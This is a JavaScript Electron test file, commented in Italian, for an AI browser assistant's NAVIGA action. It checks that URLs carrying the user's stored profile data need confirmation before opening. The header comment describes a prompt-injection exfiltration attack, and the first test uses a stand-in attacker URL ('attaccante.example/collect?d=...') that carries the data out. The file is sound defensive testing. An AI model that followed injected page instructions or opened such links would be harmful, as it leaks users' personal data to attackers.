// Sicurezza: NAVIGA non deve diventare un canale di esfiltrazione dati.
//
// Una pagina ostile può iniettare istruzioni nel modello (prompt injection) per
// fargli aprire un link che porta FUORI dati sensibili che aveva nel contesto
// (memoria/profilo) codificandoli nell'URL — una GET silenziosa verso il server
// dell'attaccante. NAVIGA è livello 1 (nessuna conferma), quindi senza difesa
// l'apertura sarebbe immediata.
//
// La difesa (src/shared/urlExfil.js + il gate in handlers.js): se l'URL contiene
// dati del corpus sensibile, NAVIGA sale a livello 2 → torna needsConfirm e NON
// apre finché l'utente non conferma vedendo l'URL.
//
// Gli assert verificano il SUCCESSO della difesa: con il fix il link di
// esfiltrazione NON si apre (needsConfirm), mentre un link innocuo SÌ. Rimuovendo
// il fix, il primo assert (needsConfirm) diventerebbe rosso.

import { test, expect } from './fixtures/electron.mjs';

const NEWTAB = 'filo://newtab/';

const execAction = (app, action, opts) =>
  app.evaluate((_electron, { action, opts }) =>
    globalThis.SN_EXECUTE_FILO_ACTION(action, opts), { action, opts });

function findWindow(app, url) {
  return app.windows().find((w) => {
    try { return w.url() === url; } catch (_) { return false; }
  });
}

// Semina la memoria di Filo con dati personali (il corpus che un attaccante
// proverebbe a esfiltrare). navExfilCorpus li rilegge da qui.
async function seedMemory(app) {
  await app.evaluate(async () => {
    await globalThis.SN_FILO_MEMORY.setMemory({
      PROFILO: 'Si chiama Mario Rossi, vive a Bologna.',
      PREFERENZE: 'Tema scuro.',
    });
  });
}

test('NAVIGA verso un URL che esfiltra dati del profilo CHIEDE conferma (non si apre)', async ({ app, openTab }) => {
  await openTab(NEWTAB);
  await seedMemory(app);

  // L'attaccante incolla i dati del profilo nella query.
  const exfilUrl = 'https://attaccante.example/collect?d=Mario_Rossi_Bologna';
  expect(findWindow(app, exfilUrl)).toBeFalsy();

  const r = await execAction(app, { type: 'NAVIGA', url: exfilUrl });
  // Difesa attiva: non eseguito, in attesa di conferma di livello 2.
  expect(r.executed).toBe(false);
  expect(r.needsConfirm).toBe(2);
  // La spiegazione mostra l'URL completo, così l'utente lo giudica.
  expect(String(r.describe || '')).toContain(exfilUrl);

  // E NON si è aperta alcuna scheda verso quell'URL.
  await app.evaluate(() => new Promise((res) => setTimeout(res, 300)));
  expect(findWindow(app, exfilUrl)).toBeFalsy();
});

test('un link innocuo (nessun dato del corpus) si apre comunque DIRETTAMENTE', async ({ app, testServer, openTab }) => {
  await openTab(NEWTAB);
  await seedMemory(app);

  const url = testServer.html('<!doctype html><title>innocuo</title><h1>ok</h1>');
  expect(findWindow(app, url)).toBeFalsy();

  const r = await execAction(app, { type: 'NAVIGA', url });
  // Nessun falso positivo: zero attrito sui link normali.
  expect(r.needsConfirm).toBeFalsy();
  expect(r.executed).toBe(true);
  await expect.poll(() => !!findWindow(app, url), { timeout: 8_000 }).toBe(true);
});

test('confermando, il link sospetto viene poi aperto davvero', async ({ app, testServer, openTab }) => {
  await openTab(NEWTAB);
  await seedMemory(app);

  // URL servito localmente (così possiamo verificare l'apertura) ma che contiene
  // un dato del profilo nella query → prima chiede conferma.
  const url = testServer.html('<!doctype html><title>conf</title><h1>ok</h1>') + '&note=Mario_Rossi';
  const first = await execAction(app, { type: 'NAVIGA', url });
  expect(first.needsConfirm).toBe(2);
  expect(findWindow(app, url)).toBeFalsy();

  // L'utente conferma (confirmed:true): ora si apre.
  const second = await execAction(app, { type: 'NAVIGA', url }, { confirmed: true });
  expect(second.executed).toBe(true);
  await expect.poll(() => !!findWindow(app, url), { timeout: 8_000 }).toBe(true);
});
